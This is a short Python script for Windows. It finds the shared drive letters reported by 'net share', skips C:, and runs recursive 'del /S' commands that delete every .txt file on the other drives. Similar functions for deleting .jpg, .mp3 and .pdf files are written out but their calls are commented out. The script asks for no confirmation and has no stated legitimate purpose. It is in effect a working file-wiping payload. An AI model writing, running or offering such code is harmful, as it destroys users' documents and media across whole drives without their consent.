from subprocess import check_output
from os import system

# Global Variable For Drive List
sys_drive=[]

#This is Function For Find Drives
def system_drive():
    drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]
    cmd = check_output("net share",shell=True)
    for i in drive:
        if i in str(cmd):
            sys_drive.append(i)
    
#This is Function for Remove JPG Files 
def remove_jpg():
    for i in sys_drive:
        if i == "C:":
            continue
        else:
            cmd = check_output(str(i)+"&& del /S *.jpg",shell=True)

# This is Function for Remove MP3 Files
def remove_mp3():
    for i in sys_drive:
        if i == "C:":
            continue
        else:
            cmd = check_output(str(i)+"&& del /S *.mp3",shell=True)

# This is Function for Remove PDF Files
def remove_pdf():
    for i in sys_drive:
        if i == "C:":
            continue
        else:
            cmd = check_output(str(i)+"&& del /S *.pdf",shell=True)

# This is Function for Remove TXT Files
def remove_txt():
    for i in sys_drive:
        if i == "C:":
            continue
        else:
            try:
                cmd = check_output(str(i) +" && "+ "del /S *.txt",shell=True)
            except:
                print("somthing wrong")
                pass
system_drive()
remove_txt()
system("PAUSE")
# remove_jpg()
# remove_mp3()
# remove_pdf()

